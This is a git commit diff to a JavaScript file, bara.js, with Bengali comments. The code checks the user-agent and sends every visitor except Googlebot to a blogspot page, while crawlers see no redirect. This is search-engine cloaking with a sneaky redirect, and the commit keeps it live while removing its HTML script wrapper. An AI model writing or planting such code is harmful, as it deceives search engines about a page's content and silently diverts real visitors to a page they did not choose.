c8462e77ed99f45280d5da3de2708426a9aa19cc
aliceekeysi-arch <aliceekeysi@gmail.com>
2026-09-16 15:24:13 +0600

    Update bara.js

--- bara.js
+++ bara.js
@@ -1,11 +1,7 @@
-<script type='text/javascript'>
-//<![CDATA[
 if (!navigator.userAgent.includes('Googlebot')) {
-  // সাধারণ ব্যবহারকারীদের জন্য - রিডাইরেক্ট করুন
+  // সাধারণ ব্যবহারকারীদের জন্য - রিডাইরেক্ট হবে
   window.location.href = "https://chu-chu-pompom.blogspot.com/2026/09/aa.html";
 } else {
-  // সার্চ ইঞ্জিন বটদের জন্য - কোনো রিডাইরেক্ট নেই
-  console.log("Thanks for visiting my page");
+  // সার্চ ইঞ্জিন বটের জন্য - কোনো রিডাইরেক্ট হবে না
+  console.log("Thanks for visiting my page" );
 }
-//]]>
-</script>
